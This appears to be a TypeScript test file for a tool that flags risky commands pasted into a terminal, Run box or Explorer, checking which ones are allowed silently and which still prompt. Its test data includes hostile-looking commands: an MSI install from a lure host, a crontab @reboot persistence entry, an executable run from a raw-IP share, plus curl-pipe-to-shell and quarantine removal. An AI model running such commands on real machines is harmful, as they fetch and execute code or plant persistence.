// Everyday commands that once prompted in the benchmark (bench/run.ts) and must stay silent.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { analyze } from '../src/index.ts';
import type { CustodyRecord } from '../src/types.ts';

const fromDocs = (originUrl: string, extra: Partial<CustodyRecord> = {}): CustodyRecord => ({
  sourceKind: 'browser', originUrl, scriptWritten: true, visibleMatch: true, lureWords: [], ...extra,
});

const SILENT: [string, string, Parameters<typeof analyze>[1]][] = [
  ['remote MSI from an official installer host', 'msiexec.exe /i https://awscli.amazonaws.com/AWSCLIV2.msi', { target: 'terminal', custody: fromDocs('https://docs.aws.amazon.com/cli/latest/userguide/getting-started-install.html') }],
  ['code-server install script', 'curl -fsSL https://code-server.dev/install.sh | sh', { target: 'terminal', custody: fromDocs('https://coder.com/docs/code-server/install') }],
  ['opening the Startup folder from Run', 'shell:startup', { target: 'run', custody: fromDocs('https://support.microsoft.com/', { scriptWritten: false, lureWords: ['Win+R'] }) }],
  ['opening a network folder in Explorer', '\\\\fileserver\\shared\\Projects', { target: 'explorer' }],
  ['editing the crontab', 'crontab -e', { target: 'terminal' }],
  ['clearing quarantine on an installed app', 'xattr -d com.apple.quarantine /Applications/MyApp.app', { target: 'terminal' }],
];
for (const [name, cmd, ctx] of SILENT) {
  test(`silent: ${name}`, () => assert.equal(analyze(cmd, ctx).action, 'allow'));
}

test('remote MSI from an unknown host still prompts', () => {
  assert.notEqual(analyze('msiexec /i https://example-lure.test/update.msi', { target: 'run' }).action, 'allow');
});
test('piping entries into crontab is still persistence', () => {
  assert.ok(analyze('(crontab -l; echo "@reboot /tmp/x") | crontab -').findings.some((f) => f.id === 'persistence'));
});
test('a program on a network share is still a fetch', () => {
  assert.ok(analyze('\\\\203.0.113.7\\share\\setup.exe', { target: 'run' }).findings.some((f) => f.id === 'network-share'));
});
